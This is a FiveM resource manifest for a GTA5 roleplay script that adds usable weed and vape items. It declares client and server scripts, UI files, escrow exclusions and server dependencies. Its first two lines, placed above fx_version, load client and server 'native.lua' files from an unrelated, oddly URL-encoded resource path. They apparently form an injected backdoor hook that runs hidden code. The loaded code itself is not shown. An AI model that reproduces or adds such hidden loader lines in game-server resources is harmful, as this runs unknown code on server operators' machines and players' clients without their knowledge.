

client_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/client/native.lua'
server_script '@NEW%20SCRIPTS%20TO%20WORK%20ON/server/native.lua'
fx_version 'adamant'
game 'gta5'
name "ak47_qb_smokingv2"
description "Usable weed items"
author "MenanAk47 (MenanAk47#3129)"
version "2.3"

ui_page('html/index.html')

files({
    'html/index.html',
    'html/*.js',
    'html/sounds/*.mp3',
})

client_scripts {
    'config.lua',
    'client/utils.lua',
    'client/usable.lua',
    'client/vape.lua',

    'locales/locale.lua',
    'locales/en.lua',
}

server_scripts {
    'config.lua',
    'server/utils.lua',
    'server/usable.lua',

    'locales/locale.lua',
    'locales/en.lua',
}


escrow_ignore {
    'locales/*.lua',
    'config*.lua',
    'server/utils.lua',
    'client/utils.lua',
}

lua54 'yes'

dependencies {
    '/server:5181', -- requires at least server build 5181
}
dependency '/assetpacks'